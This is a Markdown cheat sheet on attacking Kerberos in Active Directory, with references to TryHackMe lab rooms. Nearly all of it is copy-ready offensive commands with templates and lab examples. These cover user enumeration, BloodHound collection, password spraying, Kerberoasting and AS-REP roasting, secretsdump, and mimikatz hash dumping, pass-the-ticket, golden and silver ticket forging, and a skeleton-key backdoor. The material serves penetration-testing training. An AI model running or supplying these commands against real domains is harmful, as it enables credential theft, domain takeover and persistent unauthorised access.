# Attacking Kerberos
* [Enumeration with Kerbrute](#enumeration-with-kerbrute)
* [Enumeration with PowerView](#enumeration-with-powerview)
* [Enumeration with Bloodhound](#enumeration-with-bloodhound)
* [Harvesting and Brute Forcing Tickets with Rubeus](#harvesting-and-brute-forcing-tickets-with-rubeus)
* [Kerberoasting with Rubeus and Impacket](#kerberoasting-with-rubeus-and-impacket)
* [AS-REP Roasting with Rubeus](#as-rep-roasting-with-rubeus)
* [Pass the Ticket with mimikatz](#pass-the-ticket-with-mimikatz)
* [Golden and Silver Ticket Attacks with mimikatz](#golden-and-silver-ticket-attacks-with-mimikatz)
* [Kerberos Backdoors with mimikatz](#kerberos-backdoors-with-mimikatz)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Enumeration with Kerbrute

Kerbrute Installation:
* https://github.com/ropnop/kerbrute/releases

Brute force user accounts from a domain controller using a supplied wordlist:
```
./kerbrute userenum --dc [DOMAIN-CONTROLLER] -d [DOMAIN] [WORDLIST]
```
Example:
```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```
*********************************************************************************
## Enumeration with PowerView

Download PowerView:
* https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Start PowerShell and bypass execution policy to easily run scripts:
```
powershell -ep bypass
```

Start PowerView: 
```
. .\Powerview.ps1
```

Enumerate domain users:
```
Get-NetUser | select cn
```

Enumerate domain groups:
```
Get-NetGroup -GroupName *admin*
```

Command cheatsheet:
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

*********************************************************************************
## Enumeration with Bloodhound

### Bloodhound Installation

```
apt-get install bloodhound
```
```
neo4j console
```
Default credentials: neo4j:neo4j

### Getting loot with SharpHound

```
powershell -ep bypass
```
```
. .\Downloads\SharpHound.ps1
```
```
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
*Transfer loot.zip to attack machine*

### Mapping the Network with Bloodhound

* Run bloodhound on attack machine:
```
bloodhound
```
* Sign in with same credentials set with Neo4j
* Import the loot.zip folder
* Open menu and select queries

*********************************************************************************
## Harvesting and Brute Forcing Tickets with Rubeus

Rubeus Installation:
* https://github.com/GhostPack/Rubeus

Tell Rubeus to harvest TGTs every 30 seconds:
```
Rubeus.exe harvest /interval:30
```
Before password spraying with Rubeus, add domain controller domain name to windows host file with this command:
```
echo [DOMAIN-IP] [DOMAIN-NAME] >> C:\Windows\System32\drivers\etc\hosts
```
Example:
```
echo 10.10.24.234 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

Take given password and "spray" it against all found users then give .kirbi TGT for that user:
```
Rubeus.exe brute /password:[PASSWORD] /noticket
```
Example:
```
Rubeus.exe brute /password:Password1 /noticket
```
*********************************************************************************
## Kerberoasting with Rubeus and Impacket

### Rubeus

Dump Kerberos hash of any kerberoastable users:
```
Rubeus.exe
```

### Impacket

Impacket Installation:
* https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

Ensure dependencies are installed:
```
cd [IMPACKET-LOCATION]
```
```
pip install .
```
Navigate to where GetUserSPNs.py is located:
```
cd /usr/share/doc/python3-impacket/examples/
```
Dump Kerberos hash for all kerberoastable accounts on target machine remotely:
```
sudo python3 GetUserSPNs.py [DOMAIN-NAME]/Machine1:[PASSWORD] -dc-ip [DOMAIN-CONTROLLER-IP] -request
```
Example:
```
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.24.234 -request
```

Retrieve all password hashes from given user account:
```
python3 secretsdump.py [DOMAIN-NAME]/backup:[USERNAME]@[TARGET-IP]
```
Example: 
```
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.6.165
```
*********************************************************************************
## AS-REP Roasting with Rubeus

Look for vulnerable users then dump their hashes:
```
Rubeus.exe asreproast
```
*********************************************************************************
## Pass the Ticket with mimikatz

Run mimikatz
```
mimikatz.exe
```

Ensure proper privileges: (output '20' OK)
```
privilege::debug
```

Dump hashes:
```
lsadump::lsa /patch
```

Export all .kirbi tickets into current directory:
```
sekurlsa::tickets /export
```

Use harvested ticket to cache and impersonate given ticket:
```
kerberos::ptt [TICKET]
```

List cached tickets for impersonation verification:
```
klist
```
*********************************************************************************
## Golden and Silver Ticket Attacks with mimikatz

Dump hash and security identifier to create golden/silver ticket:
```
lsadump::lsa /inject /name:[ACCOUNT]
```
Example:
```
lsadump::lsa /inject /name:krbtgt
```

Create Golden/Silver Ticket:
```
Kerberos::[golden or silver] /user:[USERNAME] /domain:[DOMAIN-NAME] /sid:[SID] /krbtgt:[NTLM-HASH] /id:[500 (golden) OR 1103 (silver)]
```
Example:
```
Kerberos::silver /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158
860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:1103
```

Open new elevated command prompt with given ticket in mimikatz:
```
misc::cmd
```
*********************************************************************************
## Kerberos Backdoors with mimikatz

Install skeleton key:
```
misc::skeleton
```

### Accessing the Forest

* The default credentials will be: "mimikatz"

Access share without admin password example:
```
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```
*********************************************************************************
## References
* https://tryhackme.com/room/attackingkerberos#
* https://tryhackme.com/room/attacktivedirectory
* https://tryhackme.com/room/postexploit
